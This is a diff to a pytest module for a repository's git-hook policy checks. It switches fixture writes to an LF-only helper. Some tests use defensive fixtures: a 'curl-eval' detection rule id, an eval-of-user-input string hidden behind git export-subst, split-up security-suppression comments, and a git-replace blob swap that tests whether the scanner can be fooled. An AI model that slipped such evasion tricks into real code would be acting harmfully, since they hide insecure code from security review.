@@ -4,6 +4,7 @@ import ast
 import io
 import json
 import os
+import re
 import runpy
 import shutil
 import subprocess
@@ -12,7 +13,7 @@ import time
 from collections.abc import Iterator, Mapping, Sequence
 from datetime import UTC, datetime, tzinfo
 from pathlib import Path
-from typing import Any, NoReturn, Self
+from typing import Any, NoReturn, Self, cast
 from unittest import mock
 
 import pytest
@@ -70,6 +71,26 @@ def _isolate_git_config(monkeypatch: pytest.MonkeyPatch) -> None:
             monkeypatch.delenv(name, raising=False)
 
 
+def _write_lf(path: Path, content: str) -> str:
+    """Write ``content`` to ``path`` with LF endings, whatever the platform.
+
+    ``Path.write_text`` opens in text mode, so it translates ``\\n`` to the
+    platform separator and a fixture authored as LF lands as CRLF on Windows.
+    Every fixture in this module stands in for a file in this repo, and
+    ``.gitattributes`` normalises the whole repo to LF, so a CRLF fixture is
+    not a faithful stand-in. Three concrete failures on the Windows job traced
+    back to it: byte offsets computed against a re-read LF string pointed past
+    the YAML node they were meant to sit inside, and a diff between an LF base
+    commit and a CRLF working copy reported every line as changed.
+
+    Use this instead of ``path.write_text`` for any fixture. Pass
+    ``newline=`` to ``write_text`` directly only when a test needs a specific
+    non-LF separator on purpose.
+    """
+    path.write_text(content, encoding="utf-8", newline="\n")
+    return content
+
+
 def _git(
     repo: Path,
     *args: str,
@@ -96,6 +117,7 @@ def _init_repo(repo: Path, branch: str = "feature/test") -> None:
 def _commit_file(repo: Path, relative_path: str, content: str) -> str:
     path = repo / relative_path
     path.parent.mkdir(parents=True, exist_ok=True)
+    _write_lf(path, content)
     path.write_bytes(content.encode("utf-8"))
     _git(repo, "add", "--", relative_path)
     _git(repo, "commit", "-qm", f"test: add {Path(relative_path).name}")
@@ -131,10 +153,7 @@ def _copy_runtime_config(repo: Path) -> None:
                     "uv run --frozen python",
                     f'"{PYTHON_POSIX}"',
                 )
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
     for relative_path in POLICY_SUPPORT_FILES:
         source = PROJECT_ROOT / relative_path
         destination = repo / relative_path
@@ -232,7 +251,7 @@ def _powershell_partial_parsing_error(
     line: int,
     rule_id: str = "yaml.github-actions.security.curl-eval.curl-eval",
 ) -> dict[str, object]:
-    content = path.read_text(encoding="utf-8")
+    content = path.read_bytes().decode("utf-8")
     source_lines = content.splitlines(keepends=True)
     start_offset = 0
     start_col = 1
@@ -287,7 +306,7 @@ def _write_today_session(repo: Path, content: str) -> Path:
     today = datetime.now(tz=UTC).strftime("%Y-%m-%d")
     session = repo / ".agents" / "sessions" / f"{today}-session-1.json"
     session.parent.mkdir(parents=True, exist_ok=True)
-    session.write_text(content, encoding="utf-8")
+    _write_lf(session, content)
     return session
 
 
@@ -298,7 +317,7 @@ def test_adr_review_policy_blocks_stale_debate_reference(
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "old-debate.md").write_text("ADR-042 review", encoding="utf-8")
+    _write_lf(analysis / "old-debate.md", "ADR-042 review")
 
     result = policy.check_adr_review_policy(
         [".agents/architecture/ADR-062-navigation.md"],
@@ -313,7 +332,7 @@ def test_adr_review_policy_allows_fresh_evidence_and_no_adr_change(tmp_path: Pat
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "adr-062-debate.md").write_text("ADR-062 review", encoding="utf-8")
+    _write_lf(analysis / "adr-062-debate.md", "ADR-062 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -329,7 +348,7 @@ def test_adr_review_policy_matches_complete_adr_ids(tmp_path: Path) -> None:
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "adr-0620-debate.md").write_text("ADR-0620 review", encoding="utf-8")
+    _write_lf(analysis / "adr-0620-debate.md", "ADR-0620 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -347,7 +366,7 @@ def test_adr_review_policy_rejects_symlinked_debate_evidence(tmp_path: Path) -> 
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
     evidence = tmp_path / "evidence.md"
-    evidence.write_text("ADR-062 review", encoding="utf-8")
+    _write_lf(evidence, "ADR-062 review")
     (analysis / "adr-062-debate.md").symlink_to(evidence)
 
     assert (
@@ -446,7 +465,7 @@ def test_retrospective_policy_accepts_yesterday_retro_across_midnight(
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     retro = tmp_path / ".agents" / "retrospective" / "2026-03-14-session-finish.md"
     retro.parent.mkdir(parents=True, exist_ok=True)
-    retro.write_text("# Retrospective\nreal work\n", encoding="utf-8")
+    _write_lf(retro, "# Retrospective\nreal work\n")
 
     # Two paths avoid the trivial-session bypass, isolating the yesterday grace.
     assert (
@@ -471,9 +490,7 @@ def test_retrospective_policy_accepts_yesterday_session_evidence_across_midnight
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     sessions = tmp_path / ".agents" / "sessions"
     sessions.mkdir(parents=True, exist_ok=True)
-    (sessions / "2026-03-14-session-1.json").write_text(
-        '{"notes": "Learnings captured"}', encoding="utf-8"
-    )
+    _write_lf(sessions / "2026-03-14-session-1.json", '{"notes": "Learnings captured"}')
 
     # No retrospective file: the only passing path is the yesterday session log.
     assert (
@@ -498,12 +515,10 @@ def test_retrospective_policy_blocks_evidence_older_than_grace_window(
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     retro = tmp_path / ".agents" / "retrospective" / "2026-03-13-x.md"
     retro.parent.mkdir(parents=True, exist_ok=True)
-    retro.write_text("# Retrospective\nstale\n", encoding="utf-8")
+    _write_lf(retro, "# Retrospective\nstale\n")
     sessions = tmp_path / ".agents" / "sessions"
     sessions.mkdir(parents=True, exist_ok=True)
-    (sessions / "2026-03-13-session-1.json").write_text(
-        '{"notes": "Learnings captured"}', encoding="utf-8"
-    )
+    _write_lf(sessions / "2026-03-13-session-1.json", '{"notes": "Learnings captured"}')
 
     # Two paths avoid the trivial-session bypass; two-days-old evidence is stale.
     assert (
@@ -858,12 +873,9 @@ def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> Non
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p=Path('jobs.log'); old=p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + '\\n')\n")
     jobs = [
         {
             "name": "autofix",
@@ -878,7 +890,7 @@ def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> Non
         },
     ]
     config = {"pre-commit": {"jobs": jobs}}
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _commit_file(repo, "tracked", "content\n")
 
     skipped_fix = _run_lefthook(
@@ -969,7 +981,7 @@ def test_lefthook_timeout_stops_hung_job(tmp_path: Path) -> None:
     # kills at ~1s, Windows (which cannot kill the child) runs the full 5s. Kept
     # short so the Windows path, which necessarily blocks for the whole sleep,
     # does not slow the suite.
-    (repo / "hang.py").write_text("import time\n\ntime.sleep(5)\n", encoding="utf-8")
+    _write_lf(repo / "hang.py", "import time\n\ntime.sleep(5)\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -981,7 +993,7 @@ def test_lefthook_timeout_stops_hung_job(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
 
     started = time.monotonic()
     result = _run_lefthook(repo, "run", "pre-commit", "--force", check=False)
@@ -1111,17 +1123,14 @@ def test_doublestar_selects_root_level_push_file(tmp_path: Path) -> None:
     _copy_runtime_config(repo)
     detector = repo / ".claude/skills/security-detection/detect_infrastructure.py"
     detector.parent.mkdir(parents=True, exist_ok=True)
-    detector.write_text(
-        "from pathlib import Path\nimport sys\n"
-        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n",
-        encoding="utf-8",
-    )
-    (repo / "root-only.txt").write_text("base\n", encoding="utf-8")
+    _write_lf(detector, "from pathlib import Path\nimport sys\n"
+        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n")
+    _write_lf(repo / "root-only.txt", "base\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: base")
     base_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
     _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
-    (repo / "root-only.txt").write_text("head\n", encoding="utf-8")
+    _write_lf(repo / "root-only.txt", "head\n")
     _git(repo, "add", "root-only.txt")
     _git(repo, "commit", "-qm", "test: root-only push")
     head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1148,14 +1157,11 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
         "entry = sys.argv[1] + ':' + ','.join(sys.argv[2:]) + '\\n'\n"
-        "p.write_text(old + entry)\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + entry)\n")
     config = {
         "glob_matcher": "doublestar",
         "pre-commit": {
@@ -1173,12 +1179,12 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
             ]
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _commit_file(repo, "base.txt", "base\n")
     for path in ("root.md", "nested/doc.md", "root.py", "nested/source.py"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("content\n", encoding="utf-8")
+        _write_lf(target, "content\n")
         _git(repo, "add", path)
 
     _run_lefthook(repo, "run", "pre-commit", "--job", "markdown-check", "--force")
@@ -1193,13 +1199,10 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + '\\n')\n")
     jobs = [
         {"name": "mypy", "run": f'"{PYTHON_POSIX}" marker.py mypy', "glob": "**/*.py"},
         {
@@ -1222,7 +1225,7 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
             "jobs": jobs,
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _git(repo, "add", "lefthook.yml", "marker.py")
     _git(repo, "commit", "-qm", "test: base")
     base = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1230,7 +1233,7 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     for path in ("root.py", "nested/source.py", "nested/config.yml"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("value = 1\n", encoding="utf-8")
+        _write_lf(target, "value = 1\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: nested files")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1250,13 +1253,10 @@ def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> No
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('stdin.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n")
     jobs = [
         {
             "name": name,
@@ -1271,7 +1271,7 @@ def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> No
             "jobs": [{"group": {"piped": True, "jobs": jobs}}],
         }
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     push_input = f"refs/heads/feature/test {'1' * 40} refs/heads/feature/test {'2' * 40}\n"
 
     _run_lefthook(repo, "run", "pre-push", "--force", stdin=push_input)
@@ -1295,11 +1295,8 @@ def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
     _commit_file(repo, "one.py", "one = 1\n")
     head = _commit_file(repo, "two.yml", "two: true\n")
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
-        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n",
-        encoding="utf-8",
-    )
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n")
     config = {
         "glob_matcher": "doublestar",
         "pre-push": {
@@ -1312,7 +1309,7 @@ def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
             ]
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     push_input = f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n"
 
     _run_lefthook(repo, "run", "pre-push", stdin=push_input)
@@ -1338,7 +1335,7 @@ def test_native_mypy_job_partitions_duplicate_basenames(tmp_path: Path) -> None:
         filename = "bar.py" if directory == "pkg_c" else "foo.py"
         path = repo / directory / filename
         path.parent.mkdir()
-        path.write_text(f"value: int = {value}\n", encoding="utf-8")
+        _write_lf(path, f"value: int = {value}\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: duplicate basenames")
     head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1378,7 +1375,7 @@ def test_native_dispatch_forwards_argument_stdin_and_failures(tmp_path: Path) ->
     _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
     head_sha = _commit_file(repo, "tracked.txt", "head\n")
     message = repo / "message.txt"
-    message.write_text("fix: clean message\n", encoding="utf-8")
+    _write_lf(message, "fix: clean message\n")
 
     clean = _run_lefthook(
         repo,
@@ -1399,7 +1396,7 @@ def test_native_dispatch_forwards_argument_stdin_and_failures(tmp_path: Path) ->
         "--force",
         stdin=push_input,
     )
-    message.write_text(f"fix: bad {chr(0x2014)} message\n", encoding="utf-8")
+    _write_lf(message, f"fix: bad {chr(0x2014)} message\n")
     blocked_message = _run_lefthook(
         repo,
         "run",
@@ -1460,12 +1457,9 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     fixer = repo / "fixer.py"
-    fixer.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(fixer, "from pathlib import Path\nimport sys\n"
         "Path(sys.argv[1]).write_text('fixed\\n', encoding='utf-8')\n"
-        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n",
-        encoding="utf-8",
-    )
+        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -1478,13 +1472,11 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
     _commit_file(repo, "source.py", "before\n")
     _git(repo, "add", "lefthook.yml", "fixer.py")
     _git(repo, "commit", "-qm", "test: add formatter")
+    _write_lf(repo / "source.py", "changed\n")
     _write_file(repo, "source.py", "changed\n")
     _git(repo, "add", "source.py")
 
@@ -1536,12 +1528,12 @@ def _write_session_log(
     sessions.mkdir(parents=True, exist_ok=True)
     path = sessions / f"{date}-{name}.json"
     if raw is not None:
-        path.write_text(raw, encoding="utf-8")
+        _write_lf(path, raw)
     else:
         payload: dict[str, object] = {}
         if branch is not None:
             payload = {"branch": branch} if legacy else {"session": {"branch": branch}}
-        path.write_text(json.dumps(payload), encoding="utf-8")
+        _write_lf(path, json.dumps(payload))
     if mtime is not None:
         os.utime(path, (mtime, mtime))
     return path
@@ -1590,7 +1582,7 @@ def test_branch_context_exempt_during_merge(tmp_path: Path) -> None:
     assert policy.check_branch_context(repo) == 1
 
     merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
-    merge_head.write_text(f"{head}\n", encoding="utf-8")
+    _write_lf(merge_head, f"{head}\n")
 
     assert policy.check_branch_context(repo) == 0
 
@@ -1919,10 +1911,10 @@ def test_branch_context_cli_propagates_exit_codes(tmp_path: Path) -> None:
 
 def test_commit_message_policy_handles_clean_dirty_and_missing(tmp_path: Path) -> None:
     message = tmp_path / "message"
-    message.write_text("fix: clean\n", encoding="utf-8")
+    _write_lf(message, "fix: clean\n")
     assert policy.check_commit_message(message) == 0
 
-    message.write_text(f"fix: bad {chr(0x2013)} range\n", encoding="utf-8")
+    _write_lf(message, f"fix: bad {chr(0x2013)} range\n")
     assert policy.check_commit_message(message) == 1
 
     message.write_bytes(b"fix: invalid byte \xff\n")
@@ -1973,8 +1965,10 @@ def test_staged_dash_policy_reads_the_index_blob(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     _commit_file(repo, "doc.md", "clean\n")
+    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
     _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
+    _write_lf(repo / "doc.md", "working tree clean\n")
     _write_file(repo, "doc.md", "working tree clean\n")
 
     assert policy.check_staged_dashes(["doc.md"], repo) == 1
@@ -2001,8 +1995,8 @@ def test_staged_dash_policy_continues_after_clean_file(tmp_path: Path) -> None:
     _init_repo(repo)
     clean = repo / "clean.md"
     bad = repo / "bad.md"
-    clean.write_text("clean\n", encoding="utf-8")
-    bad.write_text("bad \N{EN DASH} text\n", encoding="utf-8")
+    _write_lf(clean, "clean\n")
+    _write_lf(bad, "bad \N{EN DASH} text\n")
     _git(repo, "add", "clean.md", "bad.md")
 
     assert policy.check_staged_dashes(["clean.md", "bad.md"], repo) == 1
@@ -2198,6 +2192,7 @@ def test_alternate_index_controls_staged_blob_and_generated_staging(
     alternate_index = repo / ".git/alternate-index"
     shutil.copy2(repo / ".git/index", alternate_index)
     monkeypatch.setenv("GIT_INDEX_FILE", str(alternate_index))
+    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
     _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
     generated.unlink()
@@ -2217,16 +2212,13 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     recorder = repo / "record_staged.py"
-    recorder.write_text(
-        "import os\n"
+    _write_lf(recorder, "import os\n"
         "import sys\n"
         "from pathlib import Path\n"
         "Path('observed.txt').write_text(\n"
         "    os.environ.get('GIT_INDEX_FILE', '') + '\\n' + '\\n'.join(sys.argv[1:]),\n"
         "    encoding='utf-8',\n"
-        ")\n",
-        encoding="utf-8",
-    )
+        ")\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -2238,18 +2230,15 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
-    (repo / "default.md").write_text("base\n", encoding="utf-8")
-    (repo / "alternate.md").write_text("base\n", encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
+    _write_lf(repo / "default.md", "base\n")
+    _write_lf(repo / "alternate.md", "base\n")
     _git(repo, "add", "lefthook.yml", "record_staged.py", "default.md", "alternate.md")
     _git(repo, "commit", "-qm", "test: add active-index probe")
 
     alternate_index = repo / ".git/alternate-index"
     shutil.copy2(repo / ".git/index", alternate_index)
-    (repo / "default.md").write_text("default change\n", encoding="utf-8")
+    _write_lf(repo / "default.md", "default change\n")
     _git(repo, "add", "default.md")
 
     _run_lefthook(
@@ -2261,7 +2250,7 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
     observed = repo / "observed.txt"
     assert not observed.exists()
 
-    (repo / "alternate.md").write_text("alternate change\n", encoding="utf-8")
+    _write_lf(repo / "alternate.md", "alternate change\n")
     process_env = os.environ.copy()
     process_env["GIT_INDEX_FILE"] = str(alternate_index)
     process_env["LEFTHOOK_BIN"] = LEFTHOOK
@@ -2299,7 +2288,7 @@ def test_staged_dash_policy_skips_vendored_paths(tmp_path: Path) -> None:
     _init_repo(repo)
     path = repo / "node_modules/pkg/README.md"
     path.parent.mkdir(parents=True)
-    path.write_text(f"vendor {chr(0x2014)} text\n", encoding="utf-8")
+    _write_lf(path, f"vendor {chr(0x2014)} text\n")
     _git(repo, "add", "-f", "node_modules/pkg/README.md")
 
     assert policy.check_staged_dashes(["node_modules/pkg/README.md"], repo) == 0
@@ -2310,13 +2299,13 @@ def test_action_pin_policy_checks_staged_content(tmp_path: Path) -> None:
     _init_repo(repo)
     workflow = repo / ".github/workflows/test.yml"
     workflow.parent.mkdir(parents=True)
-    workflow.write_text("steps:\n  - uses: actions/checkout@v4\n", encoding="utf-8")
+    _write_lf(workflow, "steps:\n  - uses: actions/checkout@v4\n")
     _git(repo, "add", ".github/workflows/test.yml")
 
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 1
-    workflow.write_text(
+    _write_lf(
+        workflow,
         "steps:\n  - uses: actions/checkout@1234567890123456789012345678901234567890\n",
-        encoding="utf-8",
     )
     _git(repo, "add", ".github/workflows/test.yml")
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0
@@ -2329,7 +2318,7 @@ def test_action_pin_policy_allows_local_actions_and_rejects_unsafe_paths(
     _init_repo(repo)
     workflow = repo / ".github/workflows/test.yml"
     workflow.parent.mkdir(parents=True)
-    workflow.write_text("steps:\n  - uses: ./local-action\n", encoding="utf-8")
+    _write_lf(workflow, "steps:\n  - uses: ./local-action\n")
     _git(repo, "add", ".github/workflows/test.yml")
 
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0
@@ -2342,12 +2331,12 @@ def test_security_suppression_policy_blocks_only_active_code(tmp_path: Path) -> 
     source = repo / "source.py"
     suppression_a = "# no" + "sec"
     suppression_b = "# no" + "sem" + "grep"
-    source.write_text(f"value = 1  {suppression_a}\n", encoding="utf-8")
+    _write_lf(source, f"value = 1  {suppression_a}\n")
 
     assert policy.check_security_suppressions(["source.py"], repo) == 1
-    source.write_text(f"value = 1  {suppression_b}\n", encoding="utf-8")
+    _write_lf(source, f"value = 1  {suppression_b}\n")
     assert policy.check_security_suppressions(["source.py"], repo) == 1
-    source.write_text("value = 1\n", encoding="utf-8")
+    _write_lf(source, "value = 1\n")
     assert policy.check_security_suppressions(["source.py"], repo) == 0
     assert policy.check_security_suppressions(["missing.py"], repo) == 0
 
@@ -2423,6 +2412,9 @@ def test_generated_staging_uses_the_named_allowlist(tmp_path: Path) -> None:
     _init_repo(repo)
     _commit_file(repo, ".vscode/mcp.json", '{"version": 1}\n')
     (repo / ".factory").mkdir()
+    _write_lf(repo / ".vscode/mcp.json", '{"version": 2}\n')
+    _write_lf(repo / ".factory/mcp.json", "{}\n")
+    _write_lf(repo / "unrelated.txt", "do not stage\n")
     _write_file(repo, ".vscode/mcp.json", '{"version": 2}\n')
     (repo / ".factory/mcp.json").write_text("{}\n", encoding="utf-8")
     (repo / "unrelated.txt").write_text("do not stage\n", encoding="utf-8")
@@ -2465,8 +2457,8 @@ def test_stage_generated_stages_only_allowlisted_tracked_deletion(
     _init_repo(repo)
     generated = repo / generated_path
     generated.parent.mkdir(parents=True, exist_ok=True)
-    generated.write_text("generated\n", encoding="utf-8")
-    (repo / unrelated_path).write_text("unrelated\n", encoding="utf-8")
+    _write_lf(generated, "generated\n")
+    _write_lf(repo / unrelated_path, "unrelated\n")
     _git(repo, "add", "--", generated_path, unrelated_path)
     _git(repo, "commit", "-qm", "test: add generated and unrelated files")
     generated.unlink()
@@ -2497,7 +2489,7 @@ def test_generated_staging_rejects_symlinked_ancestor(
 ) -> None:
     generated = tmp_path / ".vscode/mcp.json"
     generated.parent.mkdir(parents=True)
-    generated.write_text("{}\n", encoding="utf-8")
+    _write_lf(generated, "{}\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -2518,10 +2510,10 @@ def test_episode_extraction_stages_only_reported_output(
     _init_repo(repo)
     session = ".agents/sessions/2026-07-19-session-1-test.json"
     (repo / session).parent.mkdir(parents=True)
-    (repo / session).write_text("{}\n", encoding="utf-8")
+    _write_lf(repo / session, "{}\n")
     episode = repo / ".agents/memory/episodes/episode-2026-07-19-session-1-test.json"
     episode.parent.mkdir(parents=True)
-    episode.write_text("{}\n", encoding="utf-8")
+    _write_lf(episode, "{}\n")
     original_run = policy._run_command
 
     def fake_run(
@@ -2606,10 +2598,13 @@ def test_pushed_suppression_scan_ignores_clean_worktree_override(tmp_path: Path)
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
+    source = repo / "nested/source.py"
+    _write_lf(source, f"value = 1  {'# no' + 'sec'}\n")
     _write_file(repo, "nested/source.py", f"value = 1  {'# no' + 'sec'}\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed suppression")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
+    _write_lf(source, "value = 1\n")
     _write_file(repo, "nested/source.py", "value = 1\n")
     stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
 
@@ -2651,6 +2646,8 @@ def test_pushed_suppression_scan_ignores_unchanged_legacy_suppressions(
     _init_repo(repo)
     _commit_file(repo, "legacy.py", f"value = 1  {'# no' + 'sec'}\n")
     base = _commit_file(repo, "source.py", "value = 1\n")
+    source = repo / "source.py"
+    _write_lf(source, "value = 2\n")
     _write_file(repo, "source.py", "value = 2\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: update clean source")
@@ -2668,10 +2665,13 @@ def test_pushed_semgrep_scan_materializes_immutable_head(
     _init_repo(repo)
     _commit_file(repo, "nested/source.py", "value = 1\n")
     base = _commit_file(repo, "unchanged.py", "dangerous = True\n")
+    source = repo / "nested/source.py"
+    _write_lf(source, "dangerous = True\n")
     _write_file(repo, "nested/source.py", "dangerous = True\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
+    _write_lf(source, "dangerous = False\n")
     _write_file(repo, "nested/source.py", "dangerous = False\n")
 
     def fake_scan(
@@ -2697,6 +2697,8 @@ def test_pushed_semgrep_scan_reads_export_ignored_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
+    _write_lf(repo / "nested/source.py", "dangerous = True\n")
+    _write_lf(repo / ".gitattributes", "nested/source.py export-ignore\n")
     _write_file(repo, "nested/source.py", "dangerous = True\n")
     (repo / ".gitattributes").write_text(
         "nested/source.py export-ignore\n",
@@ -2728,6 +2730,8 @@ def test_pushed_semgrep_scan_reads_unsubstituted_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.js", "const safe = true;\n")
+    _write_lf(repo / "source.js", "const value = '$Format:a%eval(userInput);$';\n")
+    _write_lf(repo / ".gitattributes", "source.js export-subst\n")
     _write_file(repo, "source.js", "const value = '$Format:a%eval(userInput);$';\n")
     (repo / ".gitattributes").write_text("source.js export-subst\n", encoding="utf-8")
     _git(repo, "add", "source.js", ".gitattributes")
@@ -2756,13 +2760,14 @@ def test_pushed_semgrep_scan_ignores_local_replacement_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.py", "dangerous = False\n")
+    _write_lf(repo / "source.py", "dangerous = True\n")
     _write_file(repo, "source.py", "dangerous = True\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
     dangerous_blob = _git(repo, "rev-parse", f"{head}:source.py").stdout.strip()
     benign = repo / "benign.py"
-    benign.write_text("dangerous = False\n", encoding="utf-8")
+    _write_lf(benign, "dangerous = False\n")
     benign_blob = _git(repo, "hash-object", "-w", str(benign)).stdout.strip()
     _git(repo, "replace", dangerous_blob, benign_blob)
     stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
